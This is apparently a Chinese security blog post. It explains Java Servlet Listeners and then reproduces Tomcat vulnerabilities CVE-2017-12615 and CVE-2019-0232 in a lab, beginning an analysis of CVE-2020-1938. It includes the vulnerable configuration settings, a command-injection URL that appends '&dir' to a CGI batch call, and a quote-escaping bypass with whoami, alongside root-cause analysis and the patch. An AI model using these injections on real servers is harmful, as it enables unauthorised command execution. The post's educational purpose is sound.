<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-81.png" alt="img"></p>
<h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p>
<h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>下面有几个与Listener相关的概念</p>
<ul>
<li>事件：某个方法被调用，或者属性的改变</li>
<li>事件源：被监听的对象（如ServletContext、requset、方法等）</li>
<li>监听器：用于监听事件源，当发生事件时会触发监听器</li>
</ul>
<h4 id="监听器的分类"><a href="#监听器的分类" class="headerlink" title="监听器的分类"></a>监听器的分类</h4><p>监听器一共有如下8种</p>
<table>
<thead>
<tr>
<th align="left">事件源</th>
<th align="left">监听器</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">ServletContext</td>
<td align="left">ServletContextListener</td>
<td align="left">用于监听 ServletContext 对象的创建与销毁过程</td>
</tr>
<tr>
<td align="left">HttpSession</td>
<td align="left">HttpSessionListener</td>
<td align="left">用于监听 HttpSession 对象的创建和销毁过程</td>
</tr>
<tr>
<td align="left">ServletRequest</td>
<td align="left">ServletRequestListener</td>
<td align="left">用于监听 ServletRequest 对象的创建和销毁过程</td>
</tr>
<tr>
<td align="left">ServletContext</td>
<td align="left">ServletContextAttributeListener</td>
<td align="left">用于监听 ServletContext 对象的属性新增、移除和替换</td>
</tr>
<tr>
<td align="left">HttpSession</td>
<td align="left">HttpSessionAttributeListener</td>
<td align="left">用于监听 HttpSession 对象的属性新增、移除和替换</td>
</tr>
<tr>
<td align="left">ServletRequest</td>
<td align="left">ServletRequestAttributeListener</td>
<td align="left">用于监听 HttpServletRequest 对象的属性新增、移除和替换</td>
</tr>
<tr>
<td align="left">HttpSession</td>
<td align="left">HttpSessionBindingListener</td>
<td align="left">用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td>
</tr>
<tr>
<td align="left">HttpSession</td>
<td align="left">HttpSessionActivationListener</td>
<td align="left">用于监听 HttpSession 中对象活化和钝化的过程</td>
</tr>
</tbody></table>
<p>按照监听的对象不同可以划分为三类</p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListener</li>
<li>ServletRequestListener</li>
</ul>
<h4 id="ServletContextListener使用示例"><a href="#ServletContextListener使用示例" class="headerlink" title="ServletContextListener使用示例"></a>ServletContextListener使用示例</h4><p>这里我们以ServletContextListener为例，创建一个用于监听ServletContext对象的Listener，这里我仍使用注解配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package Listener;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.ServletContextEvent;</span><br><span class="line">import javax.servlet.ServletContextListener;</span><br><span class="line">import javax.servlet.annotation.WebListener;</span><br><span class="line"> </span><br><span class="line">@WebListener</span><br><span class="line">public class Hello_Listener implements ServletContextListener &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public void contextInitialized(ServletContextEvent sce) &#123;</span><br><span class="line">        System.out.println(&quot;ServletContext对象创建了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public void contextDestroyed(ServletContextEvent sce) &#123;</span><br><span class="line">        System.out.println(&quot;ServletContext对象销毁了！&quot;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在启动Tomcat服务器的时候，ServletContext对象被创建，同时触发我们设置的<code>ServletContextListener.contextInitialized()</code>方法</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-83.png" alt="img"></p>
<p>当停止Tomcat服务器时，ServletContext对象被销毁，会触发<code>ServletContextListener.contextDestroyed()</code>方法</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-84.png" alt="img"></p>
<h3 id="三者的加载顺序"><a href="#三者的加载顺序" class="headerlink" title="三者的加载顺序"></a>三者的加载顺序</h3><p>三者的加载顺序为<code>**Listener-&gt;Filter-&gt;Servlet**</code>。</p>
<p>在<code>org.apache.catalina.core.StandardContext</code>类的<code>startInternal()</code>方法中，首先调用了<code>listenerStart()</code>，接着是<code>filterStart()</code>，最后是<code>loadOnStartup()</code>。这三处调用触发了Listener、Filter、Servlet的构造加载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">if (ok) &#123;</span><br><span class="line">                if (!listenerStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));</span><br><span class="line">                    ok = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Check constraints for uncovered HTTP methods</span><br><span class="line">            // Needs to be after SCIs and listeners as they may programmatically</span><br><span class="line">            // change constraints</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                checkConstraintsForUncoveredMethods(findConstraints());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            try &#123;</span><br><span class="line">                // Start manager</span><br><span class="line">                Manager manager = getManager();</span><br><span class="line">                if (manager instanceof Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(&quot;standardContext.managerFail&quot;), e);</span><br><span class="line">                ok = false;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Configure and call application filters</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                if (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));</span><br><span class="line">                    ok = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Load and initialize all &quot;load on startup&quot; servlets</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                if (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));</span><br><span class="line">                    ok = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Start ContainerBackgroundProcessor thread</span><br><span class="line">            super.threadStart();</span><br><span class="line">        &#125;if (ok) &#123;</span><br><span class="line">                if (!listenerStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));</span><br><span class="line">                    ok = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Check constraints for uncovered HTTP methods</span><br><span class="line">            // Needs to be after SCIs and listeners as they may programmatically</span><br><span class="line">            // change constraints</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                checkConstraintsForUncoveredMethods(findConstraints());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            try &#123;</span><br><span class="line">                // Start manager</span><br><span class="line">                Manager manager = getManager();</span><br><span class="line">                if (manager instanceof Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(&quot;standardContext.managerFail&quot;), e);</span><br><span class="line">                ok = false;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Configure and call application filters</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                if (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));</span><br><span class="line">                    ok = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Load and initialize all &quot;load on startup&quot; servlets</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                if (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));</span><br><span class="line">                    ok = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            // Start ContainerBackgroundProcessor thread</span><br><span class="line">            super.threadStart();</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="tomcat安全"><a href="#tomcat安全" class="headerlink" title="tomcat安全"></a>tomcat安全</h2><p>tomcat关键文件</p>
<ol>
<li>server.xml：配置tomcat启动的端口号、host主机、Context等 </li>
<li>web.xml文件：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet </li>
<li>tomcat-users.xml：tomcat的用户密码与权限。</li>
</ol>
<h4 id="Tomcat-任意文件写入（CVE-2017-12615）"><a href="#Tomcat-任意文件写入（CVE-2017-12615）" class="headerlink" title="Tomcat 任意文件写入（CVE-2017-12615）"></a>Tomcat 任意文件写入（CVE-2017-12615）</h4><p><strong>影响范围：</strong>Apache Tomcat 7.0.0 - 7.0.81（默认配置）</p>
<p><strong>复现环境：</strong>Tomcat&#x2F;8.5.19</p>
<p><img src="https://image.3001.net/images/20210902/1630551852_61303f2ce9b4c716c6cb5.png!small?1630551859914" alt="1630551852_61303f2ce9b4c716c6cb5.png!small?1630551859914"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br><span class="line">sudo docker exec -ti 2 bash</span><br><span class="line">cat conf/web.xml |grep readonly</span><br></pre></td></tr></table></figure>

<p><strong>漏洞原理：</strong><br>漏洞的产生是由于配置不当（非默认配置），将配置文件（<br>conf&#x2F;web.xml）中的readonly设置为了false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法</p>
<h5 id="1）vulhub复现"><a href="#1）vulhub复现" class="headerlink" title="1）vulhub复现"></a>1）vulhub复现</h5><p><img src="https://image.3001.net/images/20210902/1630551857_61303f3160fa649bffab2.png!small?1630551859914" alt="1630551857_61303f3160fa649bffab2.png!small?1630551859914"></p>
<p><img src="https://image.3001.net/images/20210902/1630551862_61303f363ffaea550c7c2.png!small?1630551862744" alt="1630551862_61303f363ffaea550c7c2.png!small?1630551862744"></p>
<p><img src="https://image.3001.net/images/20210902/1630551866_61303f3a2f062718314a3.png!small?1630551868695" alt="1630551866_61303f3a2f062718314a3.png!small?1630551868695">成功上传txt！</p>
<h5 id="2）本地环境复现"><a href="#2）本地环境复现" class="headerlink" title="2）本地环境复现"></a>2）本地环境复现</h5><p><img src="https://image.3001.net/images/20210902/1630551870_61303f3e55de6b7b2a6ff.png!small?1630551871741" alt="1630551870_61303f3e55de6b7b2a6ff.png!small?1630551871741"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br></pre></td></tr></table></figure>

<p>写入！</p>
<p><img src="https://image.3001.net/images/20210902/1630551875_61303f433c44740e7ec11.png!small?1630551876462" alt="1630551875_61303f433c44740e7ec11.png!small?1630551876462"><img src="https://image.3001.net/images/20210902/1630551879_61303f4782f266a5141a1.png!small?1630551881969" alt="1630551879_61303f4782f266a5141a1.png!small?1630551881969">可以看到成功上传txt文件！</p>
<p>尝试上传jsp文件：<br><img src="https://image.3001.net/images/20210902/1630551883_61303f4b61d111db208bf.png!small?1630551884696" alt="1630551883_61303f4b61d111db208bf.png!small?1630551884696">但是直接上传jsp文件是不被允许的！！</p>
<h3 id="Tomcat-远程代码执行（CVE-2019-0232）"><a href="#Tomcat-远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat 远程代码执行（CVE-2019-0232）"></a>Tomcat 远程代码执行（CVE-2019-0232）</h3><h4 id="1）漏洞简介"><a href="#1）漏洞简介" class="headerlink" title="1）漏洞简介"></a>1）漏洞简介</h4><p>影响范围：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.0.0.M1 to 9.0.17</span><br><span class="line"></span><br><span class="line">Apache Tomcat 8.5.0 to 8.5.39</span><br><span class="line"></span><br><span class="line">Apache Tomcat 7.0.0 to 7.0.93</span><br></pre></td></tr></table></figure>

<p>影响系统： Windows</p>
<p>复现环境：9.0.17</p>
<p>Tomcat的CGI_Servlet组件默认是关闭的，在 conf&#x2F;web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable，开始操作！</p>
<h4 id="2）漏洞底层环境复现详解"><a href="#2）漏洞底层环境复现详解" class="headerlink" title="2）漏洞底层环境复现详解"></a>2）漏洞底层环境复现详解</h4><p>首先进行CGI相关的配置，在 conf&#x2F;web.xml 中启用CGIServlet：<br><img src="https://image.3001.net/images/20210902/1630552005_61303fc5077a3f76466be.png!small?1630552007666" alt="1630552005_61303fc5077a3f76466be.png!small?1630552007666"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;executable&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>

<p>这里主要的设置是 enableCmdLineArguments 和 executable 两个选项！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. enableCmdLineArguments 启用后才会将Url中的参数传递到命令行</span><br><span class="line">2. executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。</span><br></pre></td></tr></table></figure>

<p>同样在 conf&#x2F;web.xml 中启用cgi的servlet-mapping：<br><img src="https://image.3001.net/images/20210902/1630552012_61303fccb37d86d9d3a00.png!small?1630552013794" alt="1630552012_61303fccb37d86d9d3a00.png!small?1630552013794"></p>
<p>最后修改 conf&#x2F;context.xml 的 添加 privileged&#x3D;”true”属性，否则会没有权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context privileged=&quot;true&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210902/1630552018_61303fd22872c01e8d0c2.png!small?1630552020777" alt="1630552018_61303fd22872c01e8d0c2.png!small?1630552020777"></p>
<p>配置目录文件：<br>然后在<code>C:\tomcat9\webapps\ROOT\WEB-INF</code>下创建 cgi-bin目录，并在该目录下创建一个dayu.bat的文件填写任意内容即可！！</p>
<p><img src="https://image.3001.net/images/20210902/1630552022_61303fd6c9a9df059d39d.png!small?1630552023144" alt="1630552022_61303fd6c9a9df059d39d.png!small?1630552023144"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/cgi-bin/dayu1.bat?&amp;dir</span><br></pre></td></tr></table></figure>

<p>可看到成功任意代码执行！</p>
<h4 id="3）漏洞原理-java代码审计"><a href="#3）漏洞原理-java代码审计" class="headerlink" title="3）漏洞原理-java代码审计"></a>3）漏洞原理-java代码审计</h4><p>漏洞相关的代码在<code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code>中，CGIServlet提供了一个cgi的调用接口，在启用<code>enableCmdLineArguments</code>参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为<code>Runtime.getRuntime().exec</code>在Windows中和Linux中底层实现不同导致的。</p>
<p>下面以一个简单的case来说明这个问题，在Windows下创建dayu.bat：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rem dayu.bat</span><br><span class="line">echo %*</span><br></pre></td></tr></table></figure>

<p>并执行如下的Java代码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String [] cmd=&#123;&quot;dayu.bat&quot;, &quot;dayu&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<p>在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># dayu.sh</span><br><span class="line">for key in &quot;$@&quot;</span><br><span class="line">do</span><br><span class="line">    echo &#x27;$@&#x27; $key</span><br><span class="line">done</span><br><span class="line">String [] cmd=&#123;&quot;dayu.sh&quot;, &quot;dayu&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<p>此时的输出为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$@ dayu</span><br><span class="line">$@ &amp;</span><br><span class="line">$@ dir</span><br></pre></td></tr></table></figure>

<p>导致这种输出的原因是在JDK的实现中<code>Runtime.getRuntime().exec</code>实际调用了<code>ProcessBuilder</code>，而后<code>ProcessBuilder</code>调用<code>ProcessImpl</code>使用系统调用 vfork ，把所有参数直接传递至 execve。</p>
<p>用<code>strace -F -e vfork,execve java Main</code>跟踪可以看到上面的Java代码在Linux中调用为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;dayu.sh&quot;, [&quot;dayu.sh&quot;, &quot;dayu&quot;, &quot;&amp;&quot;, &quot;dir&quot;], [/* 23 vars */])</span><br></pre></td></tr></table></figure>

<p>而如果跟踪类似的PHP代码<code>system(&#39;a.sh dayu &amp; dir&#39;); </code>，得到的结果为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,  [&quot;sh&quot;, &quot;-c&quot;, &quot;a.sh dayu &amp; dir&quot;], [/* 23 vars */])</span><br></pre></td></tr></table></figure>

<p>所以Java的<code>Runtime.getRuntime().exec</code>在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是<code>CreateProcess</code>，会将参数合并成字符串，作为<code>lpComandLine</code>传入<code>CreateProcess</code>。程序启动后调用<code>GetCommandLine</code>获取参数，并调用<code>CommandLineToArgvW</code>传至 argv。在Windows中，当<code>CreateProcess</code>中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成<code>cmd.exe /c &quot;dayu.bat &amp; dir&quot;</code>，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。</p>
<p>除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如<code>dir &quot;\&quot;&amp;whoami&quot;</code>在Linux中是安全的，而在Windows会执行命令。</p>
<p>这是因为Windows在处理命令行参数时，会将 “ 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 “ ，但是对 “ 的处理有误。同样用<code>dayu.bat</code>做测试，可以发现这里只输出了 \ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。</p>
<p><strong>修复方式：</strong></p>
<p>开发者在 patch 中增加了<code>cmdLineArgumentsDecoded</code>参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。</p>
<p>校验写在<code>setupFromRequest</code>函数中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);</span><br><span class="line">if (cmdLineArgumentsDecodedPattern != null &amp;&amp;</span><br><span class="line">        !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) &#123;</span><br><span class="line">    if (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(sm.getString(&quot;cgiServlet.invalidArgumentDecoded&quot;,</span><br><span class="line">                decodedArgument, cmdLineArgumentsDecodedPattern.toString()));</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不通过时，会将<code>CGIEnvironment</code>的 valid 参数设为 false ，在之后的处理函数中会直接跳过执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (cgiEnv.isValid()) &#123;</span><br><span class="line">    CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(),</span><br><span class="line">                                  cgiEnv.getEnvironment(),</span><br><span class="line">                                  cgiEnv.getWorkingDirectory(),</span><br><span class="line">                                  cgiEnv.getParameters());</span><br><span class="line"></span><br><span class="line">    if (&quot;POST&quot;.equals(req.getMethod())) &#123;</span><br><span class="line">        cgi.setInput(req.getInputStream());</span><br><span class="line">    &#125;</span><br><span class="line">    cgi.setResponse(res);</span><br><span class="line">    cgi.run();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    res.sendError(404);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Tomcat-AJP文件包含漏洞分析（CVE-2020-1938）"><a href="#Tomcat-AJP文件包含漏洞分析（CVE-2020-1938）" class="headerlink" title="Tomcat AJP文件包含漏洞分析（CVE-2020-1938）"></a>Tomcat AJP文件包含漏洞分析（CVE-2020-1938）</h3><h4 id="1）漏洞简介-1"><a href="#1）漏洞简介-1" class="headerlink" title="1）漏洞简介"></a>1）漏洞简介</h4><p>由于Tomcat在处理<code>AJP</code>请求时，未对请求做任何验证，通过设置AJP连接器封装的request对象的属性，导致产生<strong>任意文件读取漏洞和代码执行漏洞</strong>！</p>
<p>CVE-2020-1938 又名GhostCat，之前引起了一场风雨，由长亭科技安全研究员发现的存在于Tomcat中的安全漏洞，由于Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含Tomcat上所有webapp目录下的任意文件，例如可以读取webapp配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
<p><strong>影响版本：</strong><br>Apache Tomcat 9.x &lt; 9.0.31<br>Apache Tomcat 8.x &lt; 8.5.51<br>Apache Tomcat 7.x &lt; 7.0.100<br>Apache Tomcat 6.x</p>
<p><strong>影响说明：</strong>读取webapp下的所有文件</p>
<h4 id="2）漏洞源码分析"><a href="#2）漏洞源码分析" class="headerlink" title="2）漏洞源码分析"></a>2）漏洞源码分析</h4><p>漏洞成因是两个配置文件导致：</p>
<p>Tomcat在部署时有两个重要的配置文件<code>conf/server.xml、conf/web.xml</code>。前者定义了tomcat启动时涉及的组件属性，其中包含两个connector（用于处理请求的组件）：</p>
<p><img src="https://image.3001.net/images/20210902/1630552848_613043109decac5c57908.png!small?1630552856383" alt="1630552848_613043109decac5c57908.png!small?1630552856383"></p>
<p>如果开启状态下，tomcat启动后会监听8080、8009端口，它们分别负责接受http、ajp协议的数据。后者则和普通的java Web应用一样，用来定义servlet，这里是tomcat内建的几个servlet：</p>
<p><img src="https://image.3001.net/images/20210902/1630552853_613043153dba0690e931d.png!small?1630552856384" alt="1630552853_613043153dba0690e931d.png!small?1630552856384"><img src="https://image.3001.net/images/20210902/1630552857_61304319c628b424620dc.png!small?1630552860652" alt="1630552857_61304319c628b424620dc.png!small?1630552860652">就像注解中描述的<code>default servlet</code>用来处理所有未被匹配到其他servlet的uri请求，<code>jsp servlet</code>用来处理以<code>.jsp、.jspxz</code>做后缀名的uri请求，这俩都随tomcat一起启动。</p>
<h4 id="3）tomcat结构简介详解"><a href="#3）tomcat结构简介详解" class="headerlink" title="3）tomcat结构简介详解"></a>3）tomcat结构简介详解</h4><p><img src="https://image.3001.net/images/20210902/1630552862_6130431ebeacfb432318f.png!small?1630552863116" alt="1630552862_6130431ebeacfb432318f.png!small?1630552863116">tomcat的整体架构如上图所示，一个tomcat就是一个server，其中可以包含多个service（这里指是一个抽象的逻辑层）。而每个service由Connector、Container、Jsp引擎、日志等组件构成，与此次漏洞相关的组件主要是前两者。</p>
